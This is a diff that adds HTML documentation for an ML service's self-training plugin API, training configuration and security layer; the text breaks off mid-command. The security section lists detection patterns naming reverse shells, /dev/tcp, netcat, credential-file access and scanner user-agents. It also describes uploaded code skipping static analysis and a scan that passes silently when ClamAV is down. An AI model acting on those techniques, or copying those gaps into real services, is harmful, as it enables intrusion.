+<span class="kw">from</span> app.abstract.data_source <span class="kw">import</span> MongoDBDataSource
+
+
+<span class="kw">class</span> <span class="cl">LatePaymentPredictor</span>(<span class="cl">BaseTrainer</span>):
+    name        = <span class="st">"late-payment-risk"</span>
+    framework   = <span class="st">"sklearn"</span>
+    schedule    = <span class="st">"30 1 * * *"</span>   <span class="cm"># every night at 1:30am</span>
+    description = <span class="st">"Predicts likelihood of late payment from invoice history"</span>
+    tags        = {<span class="st">"domain"</span>: <span class="st">"billing"</span>, <span class="st">"type"</span>: <span class="st">"classification"</span>}
+
+    data_source = <span class="cl">MongoDBDataSource</span>(
+        uri=<span class="st">"mongodb://mongodb:27017"</span>,
+        database=<span class="st">"pms"</span>,
+        collection=<span class="st">"invoices"</span>,
+        filter={<span class="st">"status"</span>: {<span class="st">"$in"</span>: [<span class="st">"paid"</span>, <span class="st">"overdue"</span>]}},
+        limit=<span class="nu">50000</span>,
+    )
+
+    <span class="kw">def</span> <span class="fn">preprocess</span>(<span class="dt">self</span>, raw_data):
+        <span class="kw">import</span> pandas <span class="kw">as</span> pd, numpy <span class="kw">as</span> np
+        <span class="kw">from</span> sklearn.model_selection <span class="kw">import</span> train_test_split
+
+        df = pd.<span class="cl">DataFrame</span>(raw_data)   <span class="cm"># MongoDBDataSource returns list of dicts</span>
+        df[<span class="st">"days_to_due"</span>] = (pd.to_datetime(df[<span class="st">"due_date"</span>]) - pd.to_datetime(df[<span class="st">"created_at"</span>])).dt.days
+        df[<span class="st">"late"</span>]        = (df[<span class="st">"status"</span>] == <span class="st">"overdue"</span>).astype(int)
+
+        features = [<span class="st">"amount"</span>, <span class="st">"days_to_due"</span>, <span class="st">"tenant_months_active"</span>]
+        X = df[features].<span class="fn">fillna</span>(<span class="nu">0</span>).values
+        y = df[<span class="st">"late"</span>].values
+        <span class="kw">return</span> train_test_split(X, y, test_size=<span class="nu">0.2</span>, stratify=y)
+
+    <span class="kw">def</span> <span class="fn">train</span>(<span class="dt">self</span>, data, config):
+        <span class="kw">from</span> sklearn.linear_model <span class="kw">import</span> LogisticRegression
+        X_tr, X_te, y_tr, y_te = data
+        model = <span class="cl">LogisticRegression</span>(max_iter=<span class="nu">1000</span>)
+        model.fit(X_tr, y_tr)
+        <span class="kw">return</span> model, (X_te, y_te)
+
+    <span class="kw">def</span> <span class="fn">predict</span>(<span class="dt">self</span>, model, inputs):
+        <span class="kw">import</span> numpy <span class="kw">as</span> np
+        X = np.array([[inputs[<span class="st">"amount"</span>], inputs[<span class="st">"days_to_due"</span>], inputs[<span class="st">"tenant_months_active"</span>]]])
+        prob = model.predict_proba(X)[<span class="nu">0</span>][<span class="nu">1</span>]
+        <span class="kw">return</span> {
+            <span class="st">"late_payment_risk"</span>: <span class="fn">round</span>(<span class="fn">float</span>(prob), <span class="nu">4</span>),
+            <span class="st">"risk_level"</span>: <span class="st">"high"</span> <span class="kw">if</span> prob > <span class="nu">0.7</span> <span class="kw">else</span> <span class="st">"medium"</span> <span class="kw">if</span> prob > <span class="nu">0.4</span> <span class="kw">else</span> <span class="st">"low"</span>,
+        }</code></pre>
+  </section>
+
+  <!-- Training API -->
+  <section id="train-api">
+    <h2>Self-Training Plugin API</h2>
+
+    <h3>Upload and register a trainer</h3>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/trainers/upload</code><span>Upload .py file</span></div>
+    <pre><code>curl -X POST http://localhost:8030/api/v1/trainers/upload \
+  -F <span class="st">"file=@rent_predictor.py"</span>
+
+<span class="cm"># Response</span>
+{ <span class="st">"uploaded"</span>: <span class="st">"rent_predictor.py"</span>, <span class="st">"trainers_registered"</span>: <span class="nu">1</span> }</code></pre>
+
+    <h3>Trigger training</h3>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/training/start</code><span>Trigger with optional config overrides</span></div>
+    <pre><code>curl -X POST http://localhost:8030/api/v1/training/start \
+  -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"trainer_name": "rent-predictor", "config_overrides": {"max_epochs": 50}}'</span>
+
+<span class="cm"># Response — poll the job_id</span>
+{ <span class="st">"job_id"</span>: <span class="st">"6..."</span>, <span class="st">"status"</span>: <span class="st">"queued"</span> }</code></pre>
+
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/training/start-with-data</code><span>Upload data file + start in one request</span></div>
+    <pre><code>curl -X POST http://localhost:8030/api/v1/training/start-with-data \
+  -F <span class="st">"trainer_name=rent-predictor"</span> \
+  -F <span class="st">"file=@new_data.csv"</span></code></pre>
+
+    <h3>Monitor the job</h3>
+    <pre><code><span class="cm"># Get job status</span>
+curl http://localhost:8030/api/v1/training/jobs/{job_id}
+
+<span class="cm"># List all jobs</span>
+curl http://localhost:8030/api/v1/training/jobs?trainer_name=rent-predictor
+
+<span class="cm"># Rerun a failed or completed job</span>
+curl -X POST http://localhost:8030/api/v1/training/jobs/{job_id}/rerun</code></pre>
+
+    <h3>Run inference after training</h3>
+    <pre><code>curl -X POST http://localhost:8030/api/v1/inference/rent-predictor \
+  -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"inputs": {"bedrooms": 2, "bathrooms": 1, "sq_ft": 850, "floor": 3}}'</span></code></pre>
+  </section>
+
+  <hr>
+
+  <!-- ═══════════════════════════════════════════ -->
+  <!--            AUTO-TRAINING API                -->
+  <!-- ═══════════════════════════════════════════ -->
+
+  <section id="auto-train-tabular">
+    <h2>auto_train_tabular — Zero-boilerplate Tabular Training</h2>
+    <p>The most powerful shortcut in <code class="inline">BaseTrainer</code>. Pass a DataFrame with a label column and it handles feature detection, scaling, encoding, train/val/test splitting, model selection, cross-validation, and MLflow logging automatically.</p>
+
+    <pre><code><span class="kw">class</span> <span class="cl">MyTabularTrainer</span>(<span class="cl">BaseTrainer</span>):
+    name      = <span class="st">"my-tabular-model"</span>
+    framework = <span class="st">"sklearn"</span>
+    data_source = <span class="cl">S3DataSource</span>(bucket=<span class="st">"pms-ml"</span>, key=<span class="st">"datasets/data.csv"</span>)
+
+    <span class="kw">def</span> <span class="fn">preprocess</span>(<span class="dt">self</span>, raw_data):
+        <span class="kw">import</span> pandas <span class="kw">as</span> pd, io
+        <span class="kw">return</span> pd.<span class="fn">read_csv</span>(io.<span class="cl">BytesIO</span>(raw_data))   <span class="cm"># just return the DataFrame</span>
+
+    <span class="kw">def</span> <span class="fn">train</span>(<span class="dt">self</span>, preprocessed, config: <span class="cl">TrainingConfig</span>):
+        config.task       = <span class="st">"classification"</span>   <span class="cm"># or "regression"</span>
+        config.test_split = <span class="nu">0.2</span>
+        config.val_split  = <span class="nu">0.1</span>
+        <span class="kw">return</span> <span class="dt">self</span>.<span class="fn">auto_train_tabular</span>(preprocessed, label_col=<span class="st">"target"</span>, config=config)
+
+    <span class="kw">def</span> <span class="fn">predict</span>(<span class="dt">self</span>, model, inputs: dict):
+        <span class="kw">import</span> pandas <span class="kw">as</span> pd
+        <span class="cm"># Always pass a named DataFrame — avoids column-selector issues</span>
+        row = {name: <span class="fn">float</span>(inputs.get(name, <span class="nu">0</span>)) <span class="kw">for</span> name <span class="kw">in</span> <span class="dt">self</span>.<span class="fn">get_feature_names</span>()}
+        arr = pd.<span class="cl">DataFrame</span>([row])
+        pred = model.predict(arr)[<span class="nu">0</span>]
+        proba = model.predict_proba(arr)[<span class="nu">0</span>].tolist() <span class="kw">if</span> hasattr(model, <span class="st">"predict_proba"</span>) <span class="kw">else</span> [<span class="fn">float</span>(pred)]
+        <span class="kw">return</span> {<span class="st">"prediction"</span>: <span class="fn">int</span>(pred), <span class="st">"probabilities"</span>: proba}</code></pre>
+
+    <h3>What auto_train_tabular does automatically</h3>
+    <div class="card-grid">
+      <div class="card">
+        <div class="icon">🔍</div>
+        <h3>Feature detection</h3>
+        <p>Separates numeric and categorical columns automatically. Uses integer column indices internally so inference works with both DataFrames and numpy arrays.</p>
+      </div>
+      <div class="card">
+        <div class="icon">⚙️</div>
+        <h3>Preprocessing pipeline</h3>
+        <p><code class="inline">StandardScaler</code> for numerics, <code class="inline">OrdinalEncoder</code> for categoricals — all wrapped in an sklearn <code class="inline">Pipeline</code> so scaling is never applied to test data before training.</p>
+      </div>
+      <div class="card">
+        <div class="icon">🤖</div>
+        <h3>Model selection</h3>
+        <p>Tries <code class="inline">RandomForest</code>, <code class="inline">GradientBoosting</code>, <code class="inline">LogisticRegression</code> / <code class="inline">Ridge</code>. Uses <code class="inline">config.task</code> to pick classifier vs regressor variants. Returns the best model.</p>
+      </div>
+      <div class="card">
+        <div class="icon">📊</div>
+        <h3>Evaluation</h3>
+        <p>Calls your <code class="inline">evaluate()</code> override if present, otherwise auto-evaluates with accuracy+F1+ROC-AUC (classification) or MAE+R² (regression). All metrics logged to MLflow.</p>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <strong>predict() must use DataFrame, not numpy array</strong>
+      Always pass <code class="inline">pd.DataFrame([row], columns=feature_names)</code> in your <code class="inline">predict()</code> — the sklearn Pipeline uses column positions internally, and a named DataFrame is the only safe way to ensure ordering stays correct.
+    </div>
+  </section>
+
+  <section id="auto-train-torch">
+    <h2>auto_train_torch — GPU-accelerated PyTorch Training</h2>
+    <p>Drop-in training loop for PyTorch models. Handles device selection, AMP mixed precision, gradient clipping, LR scheduling, and early stopping.</p>
+
+    <pre><code><span class="kw">import</span> torch.nn <span class="kw">as</span> nn
+<span class="kw">from</span> app.abstract.base_trainer <span class="kw">import</span> BaseTrainer, TrainingConfig
+
+
+<span class="kw">class</span> <span class="cl">MyNet</span>(nn.<span class="cl">Module</span>):
+    <span class="kw">def</span> <span class="fn">__init__</span>(<span class="dt">self</span>):
+        <span class="fn">super</span>().<span class="fn">__init__</span>()
+        <span class="dt">self</span>.layers = nn.<span class="cl">Sequential</span>(
+            nn.<span class="cl">Linear</span>(<span class="nu">10</span>, <span class="nu">128</span>), nn.<span class="cl">ReLU</span>(), nn.<span class="cl">Dropout</span>(<span class="nu">0.3</span>),
+            nn.<span class="cl">Linear</span>(<span class="nu">128</span>, <span class="nu">64</span>),  nn.<span class="cl">ReLU</span>(),
+            nn.<span class="cl">Linear</span>(<span class="nu">64</span>, <span class="nu">1</span>),
+        )
+
+    <span class="kw">def</span> <span class="fn">forward</span>(<span class="dt">self</span>, x): <span class="kw">return</span> <span class="dt">self</span>.layers(x)
+
+
+<span class="kw">class</span> <span class="cl">MyTorchTrainer</span>(<span class="cl">BaseTrainer</span>):
+    name      = <span class="st">"my-torch-model"</span>
+    framework = <span class="st">"pytorch"</span>
+
+    <span class="kw">def</span> <span class="fn">preprocess</span>(<span class="dt">self</span>, raw_data):
+        <span class="kw">import</span> pandas <span class="kw">as</span> pd, numpy <span class="kw">as</span> np, io
+        <span class="kw">from</span> sklearn.model_selection <span class="kw">import</span> train_test_split
+        df = pd.<span class="fn">read_csv</span>(io.<span class="cl">BytesIO</span>(raw_data))
+        X  = df.drop(<span class="st">"target"</span>, axis=<span class="nu">1</span>).values.astype(<span class="st">"float32"</span>)
+        y  = df[<span class="st">"target"</span>].values.astype(<span class="st">"float32"</span>)
+        <span class="kw">return</span> train_test_split(X, y, test_size=<span class="nu">0.2</span>)
+
+    <span class="kw">def</span> <span class="fn">train</span>(<span class="dt">self</span>, preprocessed, config: <span class="cl">TrainingConfig</span>):
+        X_train, X_test, y_train, y_test = preprocessed
+        model = <span class="cl">MyNet</span>()
+
+        <span class="cm"># auto_train_torch handles device, AMP, scheduler, early stopping</span>
+        trained = <span class="dt">self</span>.<span class="fn">auto_train_torch</span>(
+            model=model,
+            train_data=(X_train, y_train),
+            val_data=(X_test, y_test),   <span class="cm"># optional — enables early stopping</span>
+            config=config,
+            loss_fn=<span class="st">"bce"</span>,              <span class="cm"># "bce" | "ce" | "mse" | "mae" | custom nn.Module</span>
+        )
+        <span class="kw">return</span> trained, (X_test, y_test)</code></pre>
+
+    <h3>auto_train_torch options</h3>
+    <table>
+      <thead><tr><th>Parameter</th><th>Type</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">model</code></td><td>nn.Module</td><td>Your PyTorch model (moved to device automatically)</td></tr>
+        <tr><td><code class="inline">train_data</code></td><td>(X, y) or DataLoader</td><td>Training data</td></tr>
+        <tr><td><code class="inline">val_data</code></td><td>(X, y) or DataLoader</td><td>Optional — used for early stopping</td></tr>
+        <tr><td><code class="inline">config</code></td><td>TrainingConfig</td><td>Merged with trainer defaults</td></tr>
+        <tr><td><code class="inline">loss_fn</code></td><td>str or nn.Module</td><td>"bce", "ce", "mse", "mae", or a custom loss</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section id="training-config">
+    <h2>Full TrainingConfig Reference</h2>
+    <p>Pass as <code class="inline">config_overrides</code> in the API request, or set fields directly inside <code class="inline">train()</code>.</p>
+
+    <h3>Hardware</h3>
+    <table>
+      <thead><tr><th>Field</th><th>Type</th><th>Default</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">cuda_device</code></td><td>str</td><td>"auto"</td><td>"auto" picks CUDA if available, else CPU. Also accepts "cuda:0", "cuda:1", "mps" (Apple Silicon).</td></tr>
+        <tr><td><code class="inline">workers</code></td><td>int</td><td>4</td><td>DataLoader worker processes. Use 0 inside Docker if you hit multiprocessing errors.</td></tr>
+        <tr><td><code class="inline">batch_size</code></td><td>int</td><td>32</td><td>Mini-batch size. Larger = faster on GPU but more VRAM.</td></tr>
+        <tr><td><code class="inline">mixed_precision</code></td><td>str</td><td>"auto"</td><td>"auto" = fp16 on CUDA, no on CPU. "bf16" is more stable on Ampere+ GPUs.</td></tr>
+        <tr><td><code class="inline">dataloader_pin_memory</code></td><td>bool</td><td>true</td><td>Pinned memory speeds up GPU transfers. Set false on CPU-only machines.</td></tr>
+        <tr><td><code class="inline">prefetch_factor</code></td><td>int</td><td>2</td><td>Batches to prefetch per DataLoader worker.</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Training Loop</h3>
+    <table>
+      <thead><tr><th>Field</th><th>Type</th><th>Default</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">max_epochs</code></td><td>int</td><td>100</td><td>Hard epoch cap. Actual training may stop earlier if early_stopping triggers.</td></tr>
+        <tr><td><code class="inline">early_stopping</code></td><td>bool</td><td>true</td><td>Monitor val_loss; stop when it fails to improve for patience epochs.</td></tr>
+        <tr><td><code class="inline">early_stopping_patience</code></td><td>int</td><td>5</td><td>Epochs to wait. Increase for noisier datasets.</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Data Splitting</h3>
+    <table>
+      <thead><tr><th>Field</th><th>Type</th><th>Default</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">test_split</code></td><td>float</td><td>0.2</td><td>Fraction held out for final evaluation. Not seen during training or early stopping.</td></tr>
+        <tr><td><code class="inline">val_split</code></td><td>float</td><td>0.1</td><td>Fraction of training data used for early stopping / scheduler. Set to 0.0 to disable.</td></tr>
+        <tr><td><code class="inline">random_seed</code></td><td>int</td><td>42</td><td>Seed for all random operations — splits, weight init, augmentations.</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Optimisation</h3>
+    <table>
+      <thead><tr><th>Field</th><th>Type</th><th>Default</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">optimizer</code></td><td>str</td><td>"adam"</td><td>"adam" | "adamw" | "sgd" | "rmsprop". AdamW is usually best for fine-tuning.</td></tr>
+        <tr><td><code class="inline">learning_rate</code></td><td>float</td><td>1e-3</td><td>Initial LR. For fine-tuning pre-trained models use 2e-5 to 5e-5.</td></tr>
+        <tr><td><code class="inline">weight_decay</code></td><td>float</td><td>0.0</td><td>L2 regularisation. Try 0.01 if overfitting.</td></tr>
+        <tr><td><code class="inline">gradient_clip</code></td><td>float|null</td><td>null</td><td>Max gradient norm. Set 1.0 for RNNs/Transformers to prevent exploding gradients.</td></tr>
+        <tr><td><code class="inline">lr_scheduler</code></td><td>str|null</td><td>null</td><td>"cosine" | "linear" | "step" | "plateau". "cosine" works well for most tasks.</td></tr>
+        <tr><td><code class="inline">warmup_ratio</code></td><td>float</td><td>0.0</td><td>Fraction of total steps for LR warm-up. Use 0.06–0.1 for NLP fine-tuning.</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Task</h3>
+    <table>
+      <thead><tr><th>Field</th><th>Type</th><th>Default</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">task</code></td><td>str|null</td><td>null</td><td>Tells auto_train_tabular which model family to try. Options: "classification", "regression", "text-classification", "image-classification", "object-detection", "segmentation", "nlp-generation", "time-series", "anomaly-detection"</td></tr>
+        <tr><td><code class="inline">num_classes</code></td><td>int|null</td><td>null</td><td>Number of output classes. Required for multi-class classification. Binary = 2.</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section id="config-presets">
+    <h2>Config Presets</h2>
+    <p>Use these as <code class="inline">config_overrides</code> in the API or pick them in the UI's Training page.</p>
+
+    <details open>
+      <summary>⚡ GPU fast — maximum throughput on CUDA</summary>
+      <div class="details-body">
+        <pre><code>{
+    <span class="st">"cuda_device"</span>:     <span class="st">"cuda"</span>,
+    <span class="st">"mixed_precision"</span>: <span class="st">"fp16"</span>,
+    <span class="st">"batch_size"</span>:      <span class="nu">64</span>,
+    <span class="st">"max_epochs"</span>:      <span class="nu">30</span>,
+    <span class="st">"optimizer"</span>:       <span class="st">"adamw"</span>,
+    <span class="st">"lr_scheduler"</span>:    <span class="st">"cosine"</span>
+}</code></pre>
+      </div>
+    </details>
+
+    <details>
+      <summary>🐢 CPU safe — stable, no GPU required</summary>
+      <div class="details-body">
+        <pre><code>{
+    <span class="st">"cuda_device"</span>:           <span class="st">"cpu"</span>,
+    <span class="st">"mixed_precision"</span>:       <span class="st">"no"</span>,
+    <span class="st">"batch_size"</span>:            <span class="nu">32</span>,
+    <span class="st">"workers"</span>:               <span class="nu">2</span>,
+    <span class="st">"dataloader_pin_memory"</span>: <span class="kw">false</span>
+}</code></pre>
+      </div>
+    </details>
+
+    <details>
+      <summary>🔬 Fine-tune NLP — HuggingFace / transformer fine-tuning</summary>
+      <div class="details-body">
+        <pre><code>{
+    <span class="st">"optimizer"</span>:    <span class="st">"adamw"</span>,
+    <span class="st">"learning_rate"</span>: <span class="nu">2e-5</span>,
+    <span class="st">"warmup_ratio"</span>: <span class="nu">0.1</span>,
+    <span class="st">"lr_scheduler"</span>: <span class="st">"linear"</span>,
+    <span class="st">"max_epochs"</span>:   <span class="nu">5</span>,
+    <span class="st">"gradient_clip"</span>: <span class="nu">1.0</span>
+}</code></pre>
+      </div>
+    </details>
+
+    <details>
+      <summary>🧪 Quick test — fast iteration / sanity check</summary>
+      <div class="details-body">
+        <pre><code>{
+    <span class="st">"max_epochs"</span>:      <span class="nu">3</span>,
+    <span class="st">"batch_size"</span>:      <span class="nu">16</span>,
+    <span class="st">"test_split"</span>:      <span class="nu">0.3</span>,
+    <span class="st">"val_split"</span>:       <span class="nu">0.1</span>,
+    <span class="st">"early_stopping"</span>:  <span class="kw">false</span>
+}</code></pre>
+      </div>
+    </details>
+  </section>
+
+  <hr>
+
+  <!-- ═══════════════════════════════════════════ -->
+  <!--              SECURITY SYSTEM                -->
+  <!-- ═══════════════════════════════════════════ -->
+
+  <section id="security-overview">
+    <h2>Security System</h2>
+    <p>The ML service includes a multi-layer security system that logs every request, detects malicious IPs using heuristics + ML, and scans uploaded files for threats.</p>
+
+    <div class="card-grid">
+      <div class="card">
+        <div class="icon">🛡️</div>
+        <h3>Request Logger Middleware</h3>
+        <p>Every request is logged to MongoDB with IP, method, path, headers (credentials redacted), payload size, latency, and status. Banned IPs are rejected before the handler runs.</p>
+      </div>
+      <div class="card">
+        <div class="icon">🔍</div>
+        <h3>IP Threat Detection</h3>
+        <p>Heuristic scoring (rate limits, error rate, suspicious paths, user-agent) blended 40/60 with an ML model trained on live request data. IPs scoring ≥ 0.90 are auto-banned.</p>
+      </div>
+      <div class="card">
+        <div class="icon">🦠</div>
+        <h3>File Scanner</h3>
+        <p>Two-stage pipeline: ClamAV virus scan → static code analysis (regex + AST). All trusted developer uploads (trainer <code class="inline">.py</code> files and model ZIP archives) get ClamAV-only — static analysis is skipped because legitimate ML code has too many false positives.</p>
+      </div>
+      <div class="card">
+        <div class="icon">🤖</div>
+        <h3>IP Threat Trainer</h3>
+        <p>Self-training model (<code class="inline">ip_threat_detector</code>) that retrains every 30 minutes from live <code class="inline">ip_records</code> data. Bootstraps from synthetic data when fewer than 20 real records exist.</p>
+      </div>
+      <div class="card">
+        <div class="icon">🔒</div>
+        <h3>Runtime Audit Hook</h3>
+        <p>CPython's <code class="inline">sys.addaudithook</code> is installed in every Celery worker process before any task runs. Blocks <code class="inline">subprocess.Popen</code> (unless whitelisted), <code class="inline">os.system</code>, and sensitive file opens. Logs unexpected socket connections. Irreversible — user code cannot remove it.</p>
+      </div>
+      <div class="card">
+        <div class="icon">🌐</div>
+        <h3>SafeHttpClient</h3>
+        <p>Monitored <code class="inline">httpx</code> wrapper for use inside inference scripts and trainers. Enforces a host allowlist, 50 MB response cap, and logs every request with URL, status, latency, and response size. Raises <code class="inline">HostNotAllowedError</code> before any connection is made to a non-whitelisted host.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="ip-threat">
+    <h2>IP Threat Detection</h2>
+
+    <h3>Heuristic scoring rules</h3>
+    <table>
+      <thead><tr><th>Signal</th><th>Threshold</th><th>Score impact</th></tr></thead>
+      <tbody>
+        <tr><td>Request rate (1 min)</td><td>&gt; 300 req/min</td><td>Up to +0.30</td></tr>
+        <tr><td>Request rate (10 min)</td><td>&gt; 1500 req/10min</td><td>+0.15</td></tr>
+        <tr><td>Error rate</td><td>&gt; 60%</td><td>+0.25</td></tr>
+        <tr><td>Suspicious path hits</td><td>≥ 1 hit</td><td>Up to +0.50 (log scale)</td></tr>
+        <tr><td>Suspicious user-agent</td><td>sqlmap, nmap, nikto, etc.</td><td>+0.40</td></tr>
+        <tr><td>Huge uploads (&gt;50MB each)</td><td>&gt; 5 attempts</td><td>+0.15</td></tr>
+        <tr><td>Blocked upload ratio</td><td>&gt; 50% blocked</td><td>+0.20</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Auto-ban logic</h3>
+    <div class="callout warn">
+      <strong>Ban thresholds</strong>
+      <code class="inline">threat_score ≥ 0.90</code> → auto-ban (permanent). <code class="inline">threat_score ≥ 0.65</code> → logged as suspicious, not banned. For uploads: ClamAV virus confirmed → instant permanent ban. Code analysis flag alone does NOT trigger a ban on the first hit — 3 blocked uploads required.
+    </div>
+
+    <h3>IP whitelist (never scored)</h3>
+    <p>Private and loopback addresses are always allowed: <code class="inline">127.x</code>, <code class="inline">::1</code>, <code class="inline">10.x</code>, <code class="inline">192.168.x</code>, <code class="inline">172.16–31.x</code> (RFC-1918 + Docker bridge). Extend with the <code class="inline">SECURITY_WHITELIST_IPS</code> environment variable (comma-separated prefixes).</p>
+
+    <pre><code><span class="cm"># .env — whitelist additional IP prefixes</span>
+SECURITY_WHITELIST_IPS=203.0.113.50,198.51.100.</code></pre>
+  </section>
+
+  <section id="file-scanning">
+    <h2>File Scanning</h2>
+
+    <h3>Stage 1 — ClamAV virus scan</h3>
+    <p>All uploads go through ClamAV (<code class="inline">clamd</code> Unix socket). A confirmed signature match triggers an immediate permanent ban. If ClamAV is not running the check silently passes — the system degrades gracefully.</p>
+
+    <pre><code><span class="cm"># ClamAV is started in entrypoint.sh — definitions persisted in named volume</span>
+<span class="cm"># Update definitions (runs automatically at container start)</span>
+docker exec pms_ml freshclam
+
+<span class="cm"># Check clamd status</span>
+docker exec pms_ml clamdscan --ping</code></pre>
+
+    <h3>Stage 2 — Static code analysis (non-trusted uploads only)</h3>
+    <p>All trusted developer uploads — trainer <code class="inline">.py</code> files <strong>and</strong> model ZIP archives — are scanned with ClamAV <strong>only</strong>. Static code analysis is skipped for both because legitimate ML inference code routinely uses <code class="inline">subprocess</code> (tesseract, ffmpeg), <code class="inline">boto3.client</code> (S3), <code class="inline">os.system</code>, and similar patterns that would produce false positives.</p>
+
+    <div class="callout info">
+      <strong>Trusted upload paths (ClamAV-only)</strong>
+      <code class="inline">POST /api/v1/trainers/upload</code> · <code class="inline">POST /api/v1/training/start-with-data</code> · <code class="inline">POST /api/v1/models/deploy-pretrained/zip</code> · <code class="inline">POST /api/v1/models/deploy-pretrained/upload</code>
+    </div>
+
+    <p>For any other upload paths, the full regex + AST pipeline runs:</p>
+
+    <table>
+      <thead><tr><th>Pattern group</th><th>What it catches</th></tr></thead>
+      <tbody>
+        <tr><td>Exfiltration</td><td>Raw TCP sockets, os.system, eval/exec, outbound HTTP to non-internal hosts, SSH, FTP, SMTP, /etc/ / /proc/ reads</td></tr>
+        <tr><td>System modification</td><td>chmod/chown, shutil.rmtree, crontab edits, /etc/passwd|shadow writes, SSH key injection, iptables/systemctl commands</td></tr>
+        <tr><td>Reverse shell</td><td>SOCK_STREAM+connect pattern, /dev/tcp trick, base64.decode+exec, netcat listeners, fifo+netcat shell</td></tr>
+        <tr><td>Obfuscation</td><td>Long hex/octal escape sequences, chr() concatenation chains, zlib+base64 compressed payloads</td></tr>
+        <tr><td>AST analysis</td><td>pty/ctypes/cffi imports, __builtins__ override, __subclasses__/__globals__ introspection</td></tr>
+        <tr><td>Encoded payloads</td><td>Base64 blobs &gt;200 chars decoded and scanned for exfiltration/shell patterns (skipped for ZIP files)</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout tip">
+      <strong>String literal stripping</strong>
+      Before regex analysis, all string literals (including docstrings and triple-quoted strings) and <code class="inline">#</code> comments are blanked out. This prevents the scanner from false-positiving on pattern definition strings or documentation comments.
+    </div>
+  </section>
+
+  <section id="security-api">
+    <h2>Security API</h2>
+
+    <h3>IP Management</h3>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/security/ips</code><span>List tracked IPs — ?banned_only=true&amp;min_threat=0.5</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/security/ips/{ip}</code><span>Full IP record with request history</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/security/ips/{ip}/ban</code><span>Manually ban — body: { "reason": "...", "expires_hours": 24 }</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/security/ips/{ip}/ban</code><span>Lift ban (unban)</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/security/ips/{ip}</code><span>GDPR erasure — delete all records for this IP</span></div>
+
+    <h3>Request Logs</h3>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/security/logs</code><span>Paginated request log — ?ip=&amp;blocked_only=&amp;path=&amp;page=&amp;limit=</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/security/logs</code><span>Clear logs older than N days — ?older_than_days=30</span></div>
+
+    <h3>Dashboard</h3>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/security/dashboard</code><span>Aggregate stats: total IPs, banned count, block rate, top threats</span></div>
+
+    <h3>Quick reference</h3>
+    <pre><code><span class="cm"># Unban all IPs (emergency recovery)</span>
+docker exec pms_ml python -c "
+import asyncio, motor.motor_asyncio, os
+async def go():
+    c = motor.motor_asyncio.AsyncIOMotorClient(os.environ['MONGODB_URL'])
+    r = await c[os.environ['MONGODB_DATABASE']].ip_records.update_many(
+        {'is_banned': True},
+        {'\$set': {'is_banned': False, 'ban_reason': '', 'threat_score': 0.0}}
+    )
+    print(f'Unbanned {r.modified_count}')
+asyncio.run(go())
+"
+
+<span class="cm"># Check current ban status for an IP</span>
+curl http://localhost:8030/api/v1/security/ips/1.2.3.4
+
+<span class="cm"># View security dashboard stats</span>
+curl http://localhost:8030/api/v1/security/dashboard</code></pre>
+  </section>
+
+  <section id="ip-threat-trainer">
+    <h2>IP Threat Trainer (Built-in)</h2>
+    <p>The <code class="inline">ip_threat_detector</code> is a built-in self-training plugin that learns from live request data. It retrains automatically every 30 minutes and its predictions are blended with the heuristic scorer (40% heuristic + 60% ML).</p>
+
+    <h3>Features used</h3>
+    <table>
+      <thead><tr><th>Feature</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">rate_1m</code></td><td>Requests in the last 1 minute</td></tr>
+        <tr><td><code class="inline">rate_10m</code></td><td>Requests in the last 10 minutes</td></tr>
+        <tr><td><code class="inline">rate_1h</code></td><td>Requests in the last hour</td></tr>
+        <tr><td><code class="inline">error_rate</code></td><td>Fraction of 4xx/5xx responses</td></tr>
+        <tr><td><code class="inline">susp_path_ratio</code></td><td>Suspicious path hits / unique paths</td></tr>
+        <tr><td><code class="inline">blocked_ratio</code></td><td>Blocked uploads / total upload attempts</td></tr>
+        <tr><td><code class="inline">upload_attempts</code></td><td>Total upload attempt count</td></tr>
+        <tr><td><code class="inline">unique_paths</code></td><td>Number of unique paths accessed</td></tr>
+        <tr><td><code class="inline">total_requests</code></td><td>Total requests seen from this IP</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Labels</h3>
+    <p>Training labels are derived from the <code class="inline">ip_records</code> collection: <code class="inline">is_banned=True</code> or <code class="inline">threat_score ≥ 0.85</code> → malicious (1). <code class="inline">threat_score &lt; 0.3</code> → benign (0). Ambiguous rows are excluded.</p>
+
+    <h3>Trigger manually</h3>
+    <pre><code>curl -X POST http://localhost:8030/api/v1/training/start \
+  -H 'Content-Type: application/json' \
+  -d '{"trainer_name": "ip_threat_detector"}'
+
+<span class="cm"># Run inference directly</span>
+curl -X POST http://localhost:8030/api/v1/inference/ip_threat_detector \
+  -H 'Content-Type: application/json' \
+  -d '{"inputs": {"rate_1m": 5, "rate_10m": 20, "rate_1h": 80,
